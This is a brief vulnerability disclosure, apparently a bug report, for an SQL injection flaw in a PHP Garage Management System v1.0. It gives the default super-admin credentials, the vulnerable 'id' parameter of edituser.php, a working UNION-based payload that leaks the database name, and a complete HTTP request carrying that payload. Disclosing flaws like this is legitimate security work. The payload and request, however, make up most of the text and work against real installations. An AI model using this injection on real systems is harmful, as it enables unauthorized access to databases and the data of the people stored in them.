# Garage Management System v1.0 by mayuri_k has SQL injection

BUG_Author: HMHYHM

Login account: mayuri.infospace@gmail.com/rootadmin (Super Admin account)

vendors: https://www.sourcecodester.com/php/15485/garage-management-system-using-phpmysql-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /garage/edituser.php?id=

Vulnerability location: /garage/edituser.php?id=, id

dbname = garagedb

[+] Payload: /garage/edituser.php?id=-1'+union+select+1,database(),3,4--+ // Leak place ---> id

```sql
GET /garage/edituser.php?id=-1'+union+select+1,database(),3,4--+
HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=m6rramo7f8jalaggbvjh84b1mm
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/180587934-7fc9983e-ff72-4b8c-a208-4e427f9e4ec3.png)
